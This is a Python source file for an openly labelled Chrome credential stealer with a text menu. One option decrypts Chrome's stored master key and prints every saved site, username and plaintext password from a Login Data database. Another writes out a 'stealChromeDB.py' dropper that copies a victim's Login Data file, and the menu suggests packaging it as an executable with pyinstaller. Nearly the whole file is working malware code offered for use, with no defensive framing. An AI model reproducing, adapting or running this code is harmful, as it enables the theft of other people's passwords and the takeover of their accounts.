import os, json, base64, sqlite3, win32crypt, random, pyfiglet, sys
from Crypto.Cipher import AES
from datetime import timezone, datetime, timedelta
from rich.console import Console
from platform import system
from txts import starttxt
console = Console()
system = system()

def main():
    x = random.choice(starttxt)
    print(x)
    console.input("[blue]press enter to continue")
    if system == "Windows":
        os.system("cls")
    elif system == "Linux":
        os.system("clear")
    else:
        os.system("clear")
    console.print("""[purple]
                       ___         _    _                       
                      /___\ _ __  | |_ |_|  ___   _ __   ___  _ 
                     //  //| '_ \ | __|| | / _ \ | '_ \ / __|(_)
                    / \_// | |_) || |_ | || (_) || | | |\__ \ _ 
                    \___/  | .__/  \__||_| \___/ |_| |_||___/(_)
                           |_|                                  

                        [yellow][1]: [blue]read chrome data
                        [yellow][2]: [blue]generate a .py file to stole chrome data
                        [yellow][3]: [blue]exit""")
    while True:
        opt = console.input("[green]insert an option[yellow][1/2/3][green]:")
        if opt == "1":
            def get_datetime(chromedate):
                return datetime(1601, 1, 1) + timedelta(microseconds=chromedate)

            def decrypt_key():
                local_state_path = os.path.join(os.environ["USERPROFILE"],
                                                "AppData", "Local", "Google", "Chrome",
                                                "User Data", "Local State")
                with open(local_state_path, "r", encoding="utf-8") as f:
                    local_state = f.read()
                    local_state = json.loads(local_state)

                key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
                key = key[5:]
                return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]

            def decrypt_password(password, key):
                try:
                    iv = password[3:15]
                    password = password[15:]
                    cipher = AES.new(key, AES.MODE_GCM, iv)
                    return cipher.decrypt(password)[:-16].decode()
                except:
                    try:
                        return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
                    except:
                        return ""

            key = decrypt_key()
            filename = input("filename:")
            try:
                filename = filename.replace('"', '')
            except Exception as e:
                pass
            # connect to the database
            db = sqlite3.connect(filename)
            cursor = db.cursor()
            cursor.execute("select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins order by date_created")
            for row in cursor.fetchall():
                a_url = row[1]
                o_url = row[0]
                username = row[2]
                date_last_used = row[5]
                date_created = row[4]
                password = decrypt_password(row[3], key)
                if username or password:
                    console.print(f"Origin URL: [blue]{o_url}")
                    console.print(f"Action URL: [blue]{a_url}")
                    console.print(f"Username: [yellow]{username}")
                    console.print(f"Password: [red]{password}")
                else:
                    continue
                if date_created != 86400000000 and date_created:
                    console.print(f"Creation date: [purple]{str(get_datetime(date_created))}")
                if date_last_used != 86400000000 and date_last_used:
                    console.print(f"Last Used: [purple]{str(get_datetime(date_last_used))}")
                console.print("[green]<" + "="*25 + "[ [blue]NEW PASSWORD[green] ]" + "="*25 + ">")
                try:
                    cursor.close()
                    db.close()
                except Exception:
                    pass
        elif opt == "2":
            console.print("[blue][*][yellow] creating stealChromeDB.py ...")
            x = open("stealChromeDB.py", 'w')
            x.write("""import os
import shutil
db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
                        "Google", "Chrome", "User Data", "default", "Login Data")
filename = f'ChromeDB_{os.getenv("UserName")}' + '.db'
shutil.copyfile(db_path, filename)""")
            x.close()
            console.print("[green][+][yellow] stealChromeDB.py was created!")
            console.print("[red][!][yellow] you can convert it in a exe file with [green]pyinstaller")
        elif opt == "3":
            sys.exit()
        else:
            console.print("[red][!] ERROR: [yellow]insert a valid option!")

if __name__ == "__main__":
    main()
